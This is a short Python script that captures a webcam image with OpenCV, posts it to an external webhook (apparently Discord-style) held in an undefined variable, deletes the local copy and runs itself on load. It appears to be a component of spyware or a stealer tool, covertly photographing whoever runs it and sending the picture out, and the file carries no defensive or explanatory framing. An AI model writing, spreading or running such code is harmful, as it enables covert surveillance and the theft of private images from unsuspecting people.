import cv2
import requests
import os

def webcam(filename="webcam.jpg"):
    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            return None

        ret, frame = cam.read()
        cam.release()

        if ret:
            cv2.imwrite(filename, frame)
            return filename
        return None
    except Exception:
        return None

def sendwebhook1(file_path):
    if not os.path.isfile(file_path):
        return False
    try:
        with open(file_path, 'rb') as f:
            r = requests.post(webh, files={'file': f})
        return r.status_code == 204 or r.status_code == 200
    except Exception:
        return False

def send1():
    img_file = webcam()
    if img_file is None:
        print("Failed to capture webcam image.")
        return

    if sendwebhook1(img_file):
        print("Webcam image sent successfully.")
        os.remove(img_file)
    else:
        print("Failed to send webcam image.")

send1()
